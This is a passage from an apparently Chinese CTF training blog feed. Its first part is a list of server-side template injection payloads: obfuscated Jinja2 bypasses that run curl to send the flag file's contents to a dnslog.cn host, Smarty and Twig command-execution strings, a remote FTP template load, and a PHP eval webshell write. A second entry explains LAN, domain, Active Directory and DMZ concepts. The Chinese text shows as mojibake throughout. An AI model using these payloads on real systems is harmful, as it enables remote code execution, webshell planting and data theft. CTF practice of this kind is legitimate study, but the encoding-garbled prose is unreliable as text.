d=(b,b,dict(getit=cc,em=aa)|<span class="hljs-keyword">join</span>,b,b)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> e=dict(o=cc,s=aa)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">set</span></span> f=(lipsum|string|list)|attr(a)(k)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> p=((lipsum|attr(c))|string|list)|attr(a)(n)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> q=((lipsum|attr(c))|string|list)|attr(a)(m)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> i=(dict(curl=aa)|<span class="hljs-keyword">join</span>,f,p,dict(cat=a)|<span class="hljs-keyword">join</span>,f,g,dict(flag=aa)|<span class="hljs-keyword">join</span>,p,q,dict(vhthja=a)|<span class="hljs-keyword">join</span>,q,dict(dnslog=a)|<span class="hljs-keyword">join</span>,q,dict(cn=a)|<span class="hljs-keyword">join</span>)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">if</span></span> ((lipsum|attr(c))|attr(d)(e)).popen(i)%&#125;</span><span class="xml">atao</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">endif</span></span>%&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web372"><a href="#web372" class="headerlink" title="web372"></a>web372</h2><p>è¿‡æ»¤äº† countï¼Œå¯ä»¥ç”¨ length æ›¿ä»£ count</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="xml">Payload:?name=</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> a=dict(po=aa,p=aa)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> j=dict(eeeeeeeeeeeeeeeeee=a)|<span class="hljs-keyword">join</span>|<span class="hljs-keyword">length</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> k=dict(eeeeeeeee=a)|<span class="hljs-keyword">join</span>|<span class="hljs-keyword">length</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> l=dict(eeeeeeee=a)|<span class="hljs-keyword">join</span>|<span class="hljs-keyword">length</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|<span class="hljs-keyword">join</span>|<span class="hljs-keyword">length</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> m=dict(eeeeeeeeeeeeeeeeeeee=a)|<span class="hljs-keyword">join</span>|<span class="hljs-keyword">length</span>%&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">set</span></span> b=(lipsum|string|list)|attr(a)(j)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> c=(b,b,dict(glob=cc,als=aa)|<span class="hljs-keyword">join</span>,b,b)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> d=(b,b,dict(getit=cc,em=aa)|<span class="hljs-keyword">join</span>,b,b)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> e=dict(o=cc,s=aa)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">set</span></span> f=(lipsum|string|list)|attr(a)(k)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> p=((lipsum|attr(c))|string|list)|attr(a)(n)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> q=((lipsum|attr(c))|string|list)|attr(a)(m)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> i=(dict(curl=aa)|<span class="hljs-keyword">join</span>,f,p,dict(cat=a)|<span class="hljs-keyword">join</span>,f,g,dict(flag=aa)|<span class="hljs-keyword">join</span>,p,q,dict(fgpozq=a)|<span class="hljs-keyword">join</span>,q,dict(dnslog=a)|<span class="hljs-keyword">join</span>,q,dict(cn=a)|<span class="hljs-keyword">join</span>)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">if</span></span> ((lipsum|attr(c))|attr(d)(e)).popen(i)%&#125;</span><span class="xml">atao</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">endif</span></span>%&#125;</span><br></code></pre></td></tr></table></figure><p>è¡¥å‡ ä¸ªæ¨¡æ¿</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-3321f46859c0be9e93f9ad79f3dd1cd3_1440w.jpg"></p><p>PHP</p><ul><li>Smarty</li></ul><p>[BJDCTF2020]The mystery of ip</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&#123;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><ul><li>twig</li></ul><p>[BJDCTF2020]Cookie is so stable</p><p><a href="https://xz.aliyun.com/t/10056">https://xz.aliyun.com/t/10056</a></p><p>twig 1.x</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">//è¿œç¨‹frpåŒ…å«</span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.setCache</span>(<span class="hljs-name">&quot;ftp://ip:port&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.loadTemplate</span>(<span class="hljs-name">&quot;backdoor&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><br><span class="xml">//rce</span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;ls /&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>twig 2.x/3.x|ä½¿ç”¨å…¶æ–°ç‰ˆæœ¬çš„è¿‡æ»¤å™¨</p><p>map è¿‡æ»¤å™¨</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|map(<span class="hljs-name">&quot;system&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|map(<span class="hljs-name">&quot;passthru&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|map(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="xml"> //æ²¡æœ‰å›æ˜¾</span><br><span class="xml"></span><br><span class="xml">å½“å‘½ä»¤æ‰§è¡Œéƒ½è¢«ç¦ç”¨æ—¶ï¼Œå°è¯•å†™shell</span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;phpinfo();&quot;]</span>|map(<span class="hljs-name">&quot;assert&quot;</span>)|join(<span class="hljs-name">&quot;,&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;&#123;<span class="hljs-name">&quot;&lt;?php phpinfo();eval($_POST[whoami])&quot;</span>:<span class="hljs-string">&quot;/var/www/html/shell.php&quot;</span>&#125;|map(<span class="hljs-name">&quot;file_put_content</span></span><br><span class="hljs-name"><span class="hljs-template-variable">s&quot;</span>)&#125;&#125; // <span class="hljs-name">å†™</span> Webshell</span><br></code></pre></td></tr></table></figure><p>sort è¿‡æ»¤å™¨</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|sort(<span class="hljs-name">&quot;system&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|sort(<span class="hljs-name">&quot;passthru&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|sort(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="xml"> //æ²¡æœ‰å›æ˜¾</span><br></code></pre></td></tr></table></figure><p>filter è¿‡æ»¤å™¨</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|filter(<span class="hljs-name">&quot;system&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|filter(<span class="hljs-name">&quot;passthru&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|filter(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="xml"> //æ²¡æœ‰å›æ˜¾</span><br></code></pre></td></tr></table></figure><p>reduce è¿‡æ»¤å™¨</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[0, 0]</span>|reduce(<span class="hljs-name">&quot;system&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[0, 0]</span>|reduce(<span class="hljs-name">&quot;passthru&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[0, 0]</span>|reduce(<span class="hljs-name">&quot;exec&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>)&#125;&#125;</span><span class="xml"> //æ²¡æœ‰å›æ˜¾</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å†…ç½‘åŸºç¡€</title>
    <link href="/2021/12/05/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/"/>
    <url>/2021/12/05/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="å†…ç½‘åŸºç¡€"><a href="#å†…ç½‘åŸºç¡€" class="headerlink" title="å†…ç½‘åŸºç¡€"></a>å†…ç½‘åŸºç¡€</h1><p>å†…ç½‘ä¹ŸæŒ‡å±€åŸŸç½‘(Local Area Network,LAN),æ˜¯æŒ‡åœ¨æŸä¸€åŒºåŸŸå†…ç”±å¤šå°è®¡ç®—æœºäº’è¿è€Œæˆçš„è®¡ç®—æœºç»„</p><h2 id="å·¥ä½œç»„-Work-Group"><a href="#å·¥ä½œç»„-Work-Group" class="headerlink" title="å·¥ä½œç»„(Work Group)"></a>å·¥ä½œç»„(Work Group)</h2><p>åœ¨ä¸€ä¸ªå¤§å‹å±€åŸŸç½‘å†…ï¼Œé€šå¸¸ä¼šæœ‰å¾ˆå¤šè®¡ç®—æœºè¿æ¥ç»„æˆï¼Œä»–ä»¬ä¼šåˆ—åœ¨<strong>ç½‘ç»œé‚»å±…</strong>ä¸­ï¼Œä¸ºäº†ä½¿ç½‘ç»œå¾—åˆ°æœ‰æ•ˆçš„ç®¡ç†ï¼Œå¯¹è®¡ç®—æœºè¿›è¡Œåˆ†ç»„ï¼Œäºæ˜¯å°±äº§ç”Ÿäº†å·¥ä½œç»„ã€‚é€šå¸¸æŒ‰è®¡ç®—æœºçš„ä¸åŒåŠŸèƒ½è¿›è¡Œåˆ†ç»„</p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211205230453548.png" style="zoom:50%;" /><p>å¯ä»¥æ›´æ”¹å·¥ä½œç»„çš„åç§°åŠ å…¥å¯¹åº”çš„ç»„ï¼Œå¦‚æœç»„ååœ¨ç½‘ç»œä¸­ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆç›¸å½“äºæ–°å»ºäº†ä¸€ä¸ªå·¥ä½œç»„</p><p><strong>å·¥ä½œç»„æ²¡æœ‰æœåŠ¡å™¨å’Œå®¢æˆ·æœºä¹‹åˆ†ï¼Œéƒ½æ˜¯å¤„äºåŒä¸€åœ°ä½ï¼Œå› æ­¤ä¸èƒ½é›†ä¸­ç®¡ç†</strong></p><h2 id="åŸŸ-Domain"><a href="#åŸŸ-Domain" class="headerlink" title="åŸŸ(Domain)"></a>åŸŸ(Domain)</h2><p>å½“ä¸€ä¸ªå…¬å¸æ‹¥æœ‰ 200 å°è®¡ç®—æœºï¼Œéœ€è¦ä»¥ä¸€ä¸ªè´¦å·ç™»å½•æ¯å°è®¡ç®—æœºï¼Œå¾—ä»¥è®¿é—®æ¯å°è®¡ç®—æœºçš„èµ„æºï¼Œé‚£ä¹ˆå°±éœ€è¦æ¯å°è®¡ç®—æœºåˆ›å»ºè¿™ä¸ªè´¦å·ï¼›å½“è¿™ä¸ªè´¦å·éœ€è¦æ›´æ¢å¯†ç æ—¶ï¼Œéœ€è¦å¯¹æ¯å°è®¡ç®—æœºè¿›è¡Œæ”¹å¯†</p><p><strong>åŸŸ</strong>æ˜¯ä¸€ä¸ªæœ‰å®‰å…¨è¾¹ç•Œçš„è®¡ç®—æœºé›†åˆ(åŸŸå®‰å…¨è¾¹ç•Œä½¿ä¸åŒåŸŸçš„ç”¨æˆ·æ— æ³•è®¿é—®å¦ä¸€ä¸ªåŸŸä¸­çš„èµ„æº)ï¼ŒåŸŸæ‹¥æœ‰ä¸¥æ ¼çš„å®‰å…¨ç®¡ç†æœºåˆ¶ï¼Œç”¨æˆ·éœ€è¦è®¿é—®åŸŸå†…çš„èµ„æºï¼Œå¿…é¡»ä»¥åˆæ³•çš„èº«ä»½ç™»å½•åŸŸï¼ŒåŸŸè¿˜ç»™æ¯ä¸ªç”¨æˆ·åˆ†é…ä¸åŒçš„èº«ä»½ï¼Œå› æ­¤èµ‹äºˆäº†ä¸åŒçš„èµ„æºè®¿é—®æƒé™</p><p><strong>åŸŸæ§åˆ¶å™¨(Domain Controller,DC)</strong> æ˜¯åŸŸä¸­è´Ÿè´£éªŒè¯æ‰€æœ‰è¿æ¥åˆ°åŸŸçš„è®¡ç®—æœºå’Œç”¨æˆ·ï¼ŒåŸŸå†…çš„è®¡ç®—æœºè¦äº’ç›¸è®¿é—®ä¹Ÿéœ€è¦åŸŸæ§åˆ¶å™¨çš„å®¡æ ¸ï¼Œåœ¨åŸŸæ§åˆ¶å™¨æ•°æ®åº“ä¸­å‚¨å­˜ç€åŸŸçš„è´¦å·ã€å¯†ç ä»¥åŠåŸŸä¸­è®¡ç®—æœºä¿¡æ¯ç­‰</p><p>åªæœ‰å±äºåŸŸå†…çš„è®¡ç®—æœºä½¿ç”¨åˆæ³•çš„è´¦å·å¯†ç ç™»å½•ï¼Œæ‰èƒ½è®¿é—®åŸŸå†…çš„èµ„æº</p><p>åŸŸæœ‰å‡ ç§ç¯å¢ƒï¼š</p><ul><li><strong>å•åŸŸ</strong></li></ul><p>å°å‹ç½‘ç»œä¸€ä¸ªåŸŸå°±å¯ä»¥äº†ï¼Œé€šå¸¸ç”±æœ‰ä¸¤å°åŸŸæœåŠ¡å™¨ï¼Œä¸€å°ä½œä¸º DCï¼Œå¦ä¸€å°ä½œä¸ºå¤‡ä»½ DC</p><ul><li><strong>çˆ¶åŸŸå’Œå­åŸŸ</strong></li></ul><p>å¤„äºç®¡ç†åŠå…¶ä»–éœ€æ±‚ï¼Œéœ€è¦åœ¨ç½‘ç»œä¸­åˆ’åˆ†å¤šä¸ªåŸŸï¼Œç¬¬ä¸€ä¸ªåŸŸç§°ä¸ºçˆ¶åŸŸï¼Œå„åˆ†éƒ¨çš„åŸŸç§°ä¸ºè¯¥åŸŸçš„å­åŸŸ</p><p>æ¯”å¦‚å¤§å…¬å¸å’Œå…¶åˆ†å…¬å¸ä½äºä¸åŒçš„åœ°ç‚¹ï¼Œå°±éœ€è¦ä½¿ç”¨çˆ¶åŸŸå’Œå­åŸŸï¼Œè‹¥æŠŠåˆ†å…¬å¸æ”¾åœ¨ä¸€ä¸ªåŸŸå†…ï¼Œå°±ä¼šåœ¨ä¿¡æ¯äº¤äº’ä¸ŠèŠ±è´¹è¾ƒé•¿çš„æ—¶é—´ï¼Œå ç”¨æ›´å¤šçš„å¸¦å®½ï¼›å½“å„åˆ†å…¬å¸ä½¿ç”¨å„è‡ªçš„åŸŸæ¥ç®¡ç†è‡ªå·±çš„èµ„æºï¼Œä¿¡æ¯äº¤äº’çš„æ¡ç›®ç›¸å¯¹è¾ƒå°‘ï¼Œè€Œä¸”ç›¸æ¯”åœ¨ä¸€ä¸ªåŸŸå†…ï¼Œå¯ä»¥å‹ç¼©äº¤äº’çš„æ•°æ®ï¼ŒåŒæ—¶å¯ä»¥è‡ªå®šä¹‰å„è‡ªåŸŸçš„å®‰å…¨ç­–ç•¥ï¼Œæ¯”å¦‚å…¬å¸çš„è´¢åŠ¡éƒ¨å¸Œæœ›ä½¿ç”¨ç‰¹å®šçš„å®‰å…¨ç­–ç•¥ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†è´¢åŠ¡éƒ¨ä½œä¸ºä¸€ä¸ªå­åŸŸæ¥å•ç‹¬ç®¡ç†</p><ul><li><strong>åŸŸæ ‘</strong></li></ul><p>åŸŸæ ‘(Tree)æ˜¯å¤šä¸ªåŸŸé€šè¿‡å»ºç«‹ä¿¡ä»»å…³ç³»ç»„æˆçš„é›†åˆï¼Œä¸€ä¸ªåŸŸç®¡ç†å‘˜åªèƒ½ç®¡ç†æœ¬åŸŸï¼Œä¸èƒ½è®¿é—®å’Œç®¡ç†å…¶ä»–åŸŸï¼Œå› æ­¤å°±è¦åŸŸé—´å»ºç«‹ä¿¡ä»»å…³ç³»ï¼Œä¸¤ä¸ªåŸŸå°±å¯ä»¥äº’ç›¸è®¿é—®ï¼›åŸŸæ ‘çš„çˆ¶åŸŸå’Œå­åŸŸå°±å¯ä»¥æŒ‰éœ€äº’ç›¸ç®¡ç†ï¼Œè·¨ç½‘ç»œåˆ†é…æ–‡ä»¶å’Œæ‰“å°æœºç­‰è®¾å¤‡å’Œèµ„æºï¼Œä»è€Œåœ¨ä¸åŒçš„åŸŸä¹‹é—´å®ç°ç½‘ç»œèµ„æºçš„å…±äº«ä¸ç®¡ç†ã€é€šä¿¡å’Œä¼ è¾“</p><p>åœ¨ä¸€ä¸ªåŸŸæ ‘ä¸­ï¼Œçˆ¶åŸŸå¯ä»¥åŒ…å«å¤šä¸ªå­åŸŸï¼Œå­åŸŸæ˜¯ç›¸å¯¹çˆ¶åŸŸæ¥è¯´çš„</p><p>åŸŸ asia.abc.com çš„çº§åˆ«æ¯”åŸŸ abc.com ä½(.com åœ¨è¿™é‡Œæ˜¯ä¸€çº§åŸŸ[æœ€é«˜çº§å­åŸŸ])ï¼Œå­åŸŸåªèƒ½ä½¿ç”¨çˆ¶åŸŸçš„åå­—ä½œä¸ºå…¶åŸŸåçš„åç¼€ï¼Œåœ¨åŸŸæ ‘ä¸­ï¼ŒåŸŸçš„åå­—æ˜¯è¿ç»­çš„</p><ul><li><strong>åŸŸæ£®æ—</strong></li></ul><p>åŸŸæ£®æ—(Forest)æ˜¯æŒ‡å¤šä¸ªåŸŸæ ‘é€šè¿‡å»ºç«‹ä¿¡ä»»å…³ç³»ç»„æˆçš„é›†åˆ</p><p>å½“ä¸€ä¸ªå…¬å¸éœ€è¦å…¼å¹¶æ—¶ï¼Œä½¿ç”¨çš„åŸŸæ ‘ abc.comï¼Œè€Œè¢«å…¼å¹¶çš„å…¬å¸åŸŸæ ‘ abc.net æ— æ³•æŒ‚åœ¨åŸŸæ ‘ abc.com ä¸‹ï¼Œé‚£ä¹ˆåŸŸæ ‘ abc.com ä¸ abc.net å°±è¦é€šè¿‡å»ºç«‹ä¿¡ä»»å…³ç³»æ¥æ„æˆåŸŸæ£®æ—ï¼Œé€šè¿‡åŸŸæ ‘ä¹‹é—´çš„ä¿¡ä»»å…³ç³»ï¼Œå¯ä»¥ç®¡ç†å’Œä½¿ç”¨æ•´ä¸ªåŸŸæ£®æ—ä¸­çš„èµ„æºï¼Œå¹¶ä¿ç•™è¢«å…¼å¹¶å…¬å¸åŸæœ‰çš„ç‰¹è‰²</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/u=2184180237,1938452684&fm=253&app=138&f=PNG.png" alt="5"></p><ul><li><strong>åŸŸåæœåŠ¡å™¨</strong></li></ul><p>åŸŸåæœåŠ¡å™¨(Domain Name Server,DNS)æ˜¯æŒ‡ç”¨äºå®ç°åŸŸå(Domain Name)å’Œä¸ä¹‹å¯¹åº”çš„ IP åœ°å€(IP Address)æ˜ å°„çš„æœåŠ¡å™¨</p><p>DNS æœåŠ¡å™¨å’Œ DC ä¸€èˆ¬é…ç½®åœ¨åŒä¸€å°æœºå™¨ä¸Š</p><p><a href="https://www.cnblogs.com/chenjiangfeng/p/9706483.html">https://www.cnblogs.com/chenjiangfeng/p/9706483.html</a></p><ul><li><strong>æ´»åŠ¨ç›®å½•</strong></li></ul><p>æ´»åŠ¨ç›®å½•(Active Directory,AD)æ˜¯æŒ‡åŸŸç¯å¢ƒä¸­æä¾›ç›®å½•æœåŠ¡çš„ç»„ä»¶</p><p>ç›®å½•å­˜å‚¨äº†ç½‘ç»œå¯¹è±¡(ç”¨æˆ·ã€ç»„ã€è®¡ç®—æœºã€å…±äº«èµ„æºã€æ‰“å°æœºå’Œè”ç³»äººç­‰)ï¼Œç›®å½•æœåŠ¡æ˜¯å¸®åŠ©ç”¨æˆ·å¿«é€Ÿã€å‡†ç¡®åœ°ä»ç›®å½•ä¸­æ‰¾åˆ°å…¶æ‰€éœ€è¦çš„ä¿¡æ¯çš„æœåŠ¡ï¼Œè€Œæ´»åŠ¨ç›®å½•å®ç°äº†ï¼Œç›®å½•æœåŠ¡ï¼Œä¸ºä¼ä¸šæä¾›äº†ç½‘ç»œä¸­æ‰€æœ‰èµ„æºçš„å¿«æ·æ–¹å¼ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡å¯»æ‰¾å¿«æ·æ–¹å¼æ¥å®šä½èµ„æº</p><p>æ´»åŠ¨ç›®å½•çš„é€»è¾‘ç»“æ„åŒ…æ‹¬ï¼šç»„ç»‡å•å…ƒ(OU)ã€åŸŸã€åŸŸæ ‘ã€åŸŸæ£®æ—</p><p>æ´»åŠ¨ç›®å½•åŠŸèƒ½æœ‰ï¼š</p><ol><li>è´¦å·é›†ä¸­ç®¡ç†ï¼Œæ‰€æœ‰è´¦å·å‚¨å­˜åœ¨æœåŠ¡å™¨ä¸­ï¼Œå¯ä»¥ç»Ÿä¸€æ‰§è¡Œå‘½ä»¤å’Œé‡ç½®å¯†ç </li><li>è½¯ä»¶é›†ä¸­ç®¡ç†ï¼Œç»Ÿä¸€æ¨é€è½¯ä»¶ï¼Œå®‰è£…ç½‘ç»œæ‰“å°æœºï¼Œåˆ©ç”¨è½¯ä»¶å‘å¸ƒç­–ç•¥åˆ†å‘è½¯ä»¶ï¼Œè®©ç”¨æˆ·å®‰è£…è½¯ä»¶</li><li>ç¯å¢ƒé›†ä¸­ç®¡ç†ï¼Œç»Ÿä¸€å®¢æˆ·ç«¯æ¡Œé¢ï¼ŒTCP/IP åè®®è®¾ç½®</li><li>å¢å¼ºå®‰å…¨æ€§ï¼Œç»Ÿä¸€éƒ¨ç½²ä¼ä¸šæ€æ¯’è½¯ä»¶ï¼Œå»ºç«‹è®¡åˆ’æ‰«æä»»åŠ¡(æŸ¥æ€ç—…æ¯’ï¼Œæ›´æ–°è¡¥ä¸ï¼Œé‡Šæ”¾ä¸´æ—¶æ–‡ä»¶)ï¼Œé›†ä¸­ç®¡ç†ç”¨æˆ·çš„æƒé™ï¼Œå¯¹ç”¨æˆ·å¯†ç å®šåˆ¶ç­–ç•¥ï¼Œç›‘æ§ç½‘ç»œï¼Œå¯¹èµ„æ–™ç»Ÿä¸€ç®¡ç†</li><li>åŠæ—¶è§„é¿é£é™©ï¼Œåˆ©ç”¨æ´»åŠ¨ç›®å½•æ§åˆ¶ç”¨æˆ·æƒé™ï¼Œåˆ©ç”¨ç¾¤é›†ã€è´Ÿè½½å‡è¡¡å¯¹æœåŠ¡å™¨è¿›è¡Œå®¹ç¾è®¾ç½®</li></ol><ul><li><strong>åŸŸæ§åˆ¶å™¨å’Œæ´»åŠ¨ç›®å½•çš„åŒºåˆ«</strong></li></ul><p>å®‰è£…äº† ADï¼Œå°±æ˜¯ DC äº†</p><ul><li><strong>å®‰å…¨åŸŸçš„åˆ’åˆ†</strong></li></ul><p>åˆ’åˆ†å®‰å…¨åŸŸçš„ç›®çš„æ˜¯å°†ä¸€ç»„å®‰å…¨ç­‰çº§ç›¸åŒçš„è®¡ç®—æœºåˆ’å…¥åŒä¸€ä¸ªç½‘æ®µï¼Œ ç½‘æ®µå†…çš„è®¡ç®—æœºæ‹¥æœ‰ç›¸åŒçš„ç½‘ç»œè¾¹ç•Œï¼Œå¹¶åœ¨ç½‘ç»œè¾¹ç•Œé€šè¿‡éƒ¨ç½²é˜²ç«å¢™æ¥å®ç°å¯¹å…¶ä»–å®‰å…¨åŸŸçš„ç½‘ç»œè®¿é—®æ§åˆ¶ç­–ç•¥(NACL)ï¼Œå…è®¸å“ªäº› IP è®¿é—®æ­¤åŸŸã€å…è®¸æ­¤åŸŸè®¿é—®å“ªäº› IP åœ°å€å’Œç½‘æ®µè¿›è¡Œè®¾ç½®</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/fghsdhfghk.jpg"></p><p>ä¸€ä¸ªç”¨è·¯ç”±å™¨è¿æ¥çš„å†…ç½‘ï¼Œå¯ä»¥å°†ç½‘ç»œåˆ’åˆ†å›´æ®´ä¸‰ä¸ªåŒºåŸŸï¼šå®‰å…¨çº§åˆ«æœ€é«˜çš„å†…ç½‘ï¼›å®‰å…¨çº§åˆ«ä¸­ç­‰çš„ DMZï¼›å®‰å…¨çº§åˆ«æœ€ä½çš„å¤–ç½‘(Internet)</p><p>DMZ 